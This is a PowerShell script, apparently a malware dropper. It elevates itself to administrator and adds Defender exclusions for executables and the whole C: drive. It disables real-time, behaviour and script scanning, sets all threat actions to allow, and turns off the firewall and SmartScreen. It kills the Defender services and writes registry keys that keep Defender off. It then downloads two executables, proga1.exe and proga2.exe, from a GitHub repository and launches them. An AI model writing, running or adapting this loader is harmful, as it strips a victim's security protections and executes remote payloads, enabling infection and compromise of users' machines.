Param([switch]$shouldAssumeToBeElevated, [String]$workingDirOverride)

if(-not($PSBoundParameters.ContainsKey('workingDirOverride'))) { 
    $workingDirOverride = (Get-Location).Path 
}

function Test-Admin {
    $currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
    $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
}

if ((Test-Admin) -eq $false) {
    if ($shouldAssumeToBeElevated) {
        Write-Output "Elevation failed"
        exit
    } else {
        Start-Process powershell.exe -Verb RunAs -ArgumentList ('-noprofile -executionpolicy bypass -file "{0}" -shouldAssumeToBeElevated -workingDirOverride "{1}"' -f ($myinvocation.MyCommand.Definition, "$workingDirOverride"))
    }
    exit
}

Set-Location "$workingDirOverride"

Write-Host "========================================" -ForegroundColor Yellow
Write-Host "=== DISABLING WINDOWS DEFENDER ===" -ForegroundColor Yellow
Write-Host "========================================" -ForegroundColor Yellow

# Exclusion extensions (как в Python скрипте)
Write-Host "[1/3] Adding exclusions..." -ForegroundColor Cyan
Add-MpPreference -ExclusionExtension ".exe" -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionExtension ".tmp" -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionExtension ".dll" -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionExtension ".scr" -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionPath "C:\" -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionPath "$env:USERPROFILE\Downloads" -ErrorAction SilentlyContinue
Write-Host "  Exclusions added" -ForegroundColor Green

# Disable all protections (как в Python скрипте)
Write-Host "[2/3] Disabling all protections..." -ForegroundColor Cyan

# Disable Controlled Folder Access
Set-MpPreference -EnableControlledFolderAccess Disabled -ErrorAction SilentlyContinue
Write-Host "  Controlled Folder Access: DISABLED" -ForegroundColor Gray

# Disable PUA Protection
Set-MpPreference -PUAProtection Disabled -ErrorAction SilentlyContinue
Write-Host "  PUA Protection: DISABLED" -ForegroundColor Gray

# Disable Block At First Seen
Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
Write-Host "  Block At First Seen: DISABLED" -ForegroundColor Gray

# Disable IOAV Protection
Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
Write-Host "  IOAV Protection: DISABLED" -ForegroundColor Gray

# Disable Privacy Mode
Set-MpPreference -DisablePrivacyMode $true -ErrorAction SilentlyContinue
Write-Host "  Privacy Mode: DISABLED" -ForegroundColor Gray

# Disable Signature Update
Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true -ErrorAction SilentlyContinue
Write-Host "  Signature Update: DISABLED" -ForegroundColor Gray

# Disable Archive Scanning
Set-MpPreference -DisableArchiveScanning $true -ErrorAction SilentlyContinue
Write-Host "  Archive Scanning: DISABLED" -ForegroundColor Gray

# Disable Intrusion Prevention System
Set-MpPreference -DisableIntrusionPreventionSystem $true -ErrorAction SilentlyContinue
Write-Host "  Intrusion Prevention: DISABLED" -ForegroundColor Gray

# Disable Script Scanning
Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
Write-Host "  Script Scanning: DISABLED" -ForegroundColor Gray

# Disable Real-time monitoring (ключевое!)
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
Write-Host "  Real-time Monitoring: DISABLED" -ForegroundColor Gray

# Disable Behavior Monitoring
Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
Write-Host "  Behavior Monitoring: DISABLED" -ForegroundColor Gray

# Sample submission consent
Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue
Write-Host "  Sample Submission: DISABLED" -ForegroundColor Gray

# MAPS Reporting
Set-MpPreference -MAPSReporting 0 -ErrorAction SilentlyContinue
Write-Host "  MAPS Reporting: DISABLED" -ForegroundColor Gray

# Threat default actions (6 = Allow)
Set-MpPreference -HighThreatDefaultAction 6 -Force -ErrorAction SilentlyContinue
Set-MpPreference -ModerateThreatDefaultAction 6 -ErrorAction SilentlyContinue
Set-MpPreference -LowThreatDefaultAction 6 -ErrorAction SilentlyContinue
Set-MpPreference -SevereThreatDefaultAction 6 -ErrorAction SilentlyContinue
Write-Host "  Threat actions: ALLOW ALL" -ForegroundColor Gray

# Disable scheduled scan
Set-MpPreference -ScanScheduleDay 8 -ErrorAction SilentlyContinue
Write-Host "  Scheduled Scan: DISABLED" -ForegroundColor Gray

# Disable Windows Firewall
Write-Host "[3/3] Disabling Windows Firewall..." -ForegroundColor Cyan
netsh advfirewall set allprofiles state off 2>&1 | Out-Null
Write-Host "  Windows Firewall: DISABLED" -ForegroundColor Green

# Stop Defender services
Write-Host ""
Write-Host "Stopping Defender services..." -ForegroundColor Cyan
$services = @("WinDefend", "WdNisSvc", "MDCoreSvc", "SecurityHealthService", "Sense")
foreach ($svc in $services) {
    try {
        Stop-Service $svc -Force -ErrorAction SilentlyContinue
        Write-Host "  Stopped: $svc" -ForegroundColor Gray
    } catch {}
}

# Kill Defender processes
Write-Host ""
Write-Host "Killing Defender processes..." -ForegroundColor Cyan
$processes = @("MsMpEng", "NisSrv", "SecurityHealthService", "MsSense", "MpCmdRun")
foreach ($proc in $processes) {
    try {
        Stop-Process -Name $proc -Force -ErrorAction SilentlyContinue
        Write-Host "  Killed: $proc" -ForegroundColor Gray
    } catch {}
}

# Registry keys for permanent disable
Write-Host ""
Write-Host "Setting registry keys..." -ForegroundColor Cyan
reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f 2>&1 | Out-Null
reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d 1 /f 2>&1 | Out-Null
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /f 2>&1 | Out-Null
Write-Host "  Registry keys set" -ForegroundColor Green

Write-Host ""
Write-Host "========================================" -ForegroundColor Yellow
Write-Host "=== WAITING 25 SECONDS ===" -ForegroundColor Yellow
Write-Host "========================================" -ForegroundColor Yellow

# Ждем 25 секунд как в Python скрипте
for ($i = 25; $i -gt 0; $i--) {
    Write-Host "  $i seconds remaining..." -ForegroundColor Gray
    Start-Sleep -Seconds 1
}

Write-Host ""
Write-Host "========================================" -ForegroundColor Yellow
Write-Host "=== DOWNLOADING FILES ===" -ForegroundColor Yellow
Write-Host "========================================" -ForegroundColor Yellow

$temp = $env:TEMP
$downloaded = 0

function Download-File {
    param($url, $dest)
    
    if (Test-Path $dest) { 
        Remove-Item $dest -Force -ErrorAction SilentlyContinue 
    }
    
    try {
        Write-Host "Downloading: $url" -ForegroundColor Gray
        # Используем BITS как в Python скрипте
        Start-BitsTransfer -Source $url -Destination $dest -Priority High -ErrorAction Stop
        return $true
    } catch {
        Write-Host "BITS failed, trying WebClient..." -ForegroundColor DarkYellow
        try {
            $wc = New-Object System.Net.WebClient
            $wc.Headers.Add("User-Agent", "Mozilla/5.0")
            $wc.DownloadFile($url, $dest)
            $wc.Dispose()
            return $true
        } catch {
            Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
            return $false
        }
    }
}

$url1 = "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/proga1.exe"
$dest1 = "$temp\proga1.exe"

Write-Host "[1/2] proga1.exe" -ForegroundColor Cyan
if (Download-File $url1 $dest1) {
    if ((Get-Item $dest1).Length -gt 0) {
        Write-Host "SUCCESS: proga1.exe ($([math]::Round((Get-Item $dest1).Length / 1KB, 2)) KB)" -ForegroundColor Green
        $downloaded++
    }
}

$url2 = "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/proga2.exe"
$dest2 = "$temp\proga2.exe"

Write-Host "[2/2] proga2.exe" -ForegroundColor Cyan
if (Download-File $url2 $dest2) {
    if ((Get-Item $dest2).Length -gt 0) {
        Write-Host "SUCCESS: proga2.exe ($([math]::Round((Get-Item $dest2).Length / 1KB, 2)) KB)" -ForegroundColor Green
        $downloaded++
    }
} else {
    Write-Host "WARNING: proga2.exe not found, copying from proga1.exe" -ForegroundColor Yellow
    if (Test-Path $dest1) {
        Copy-Item $dest1 $dest2 -Force
        Write-Host "  Copy created" -ForegroundColor Green
        $downloaded++
    }
}

Write-Host ""
Write-Host "========================================" -ForegroundColor Yellow
Write-Host "=== RUNNING FILES ===" -ForegroundColor Yellow
Write-Host "========================================" -ForegroundColor Yellow

# Disable SmartScreen
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Force -ErrorAction SilentlyContinue

function Run-File {
    param($path, $name)
    
    if (-not (Test-Path $path)) {
        Write-Host "$name not found!" -ForegroundColor Red
        return $false
    }
    
    Write-Host "Starting $name ..." -ForegroundColor Green
    
    # Пробуем разные методы запуска
    try {
        Start-Process -FilePath $path -WindowStyle Normal -ErrorAction Stop
        Write-Host "  Started successfully" -ForegroundColor Gray
        return $true
    } catch {
        Write-Host "  Start-Process failed: $($_.Exception.Message)" -ForegroundColor DarkYellow
    }
    
    # Метод через cmd
    try {
        cmd /c start "" "$path"
        Write-Host "  Started via cmd" -ForegroundColor Gray
        return $true
    } catch {
        Write-Host "  cmd method failed" -ForegroundColor DarkYellow
    }
    
    # Метод через Invoke-Item
    try {
        Invoke-Item $path -ErrorAction Stop
        Write-Host "  Started via Invoke-Item" -ForegroundColor Gray
        return $true
    } catch {
        Write-Host "  FAILED to run $name" -ForegroundColor Red
        return $false
    }
}

Run-File $dest1 "proga1.exe"
Start-Sleep -Seconds 2
Run-File $dest2 "proga2.exe"

Write-Host ""
Write-Host "========================================" -ForegroundColor Green
Write-Host "=== DONE ($downloaded/2 files) ===" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Green
Write-Host ""
Write-Host "Press any key to exit..."
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
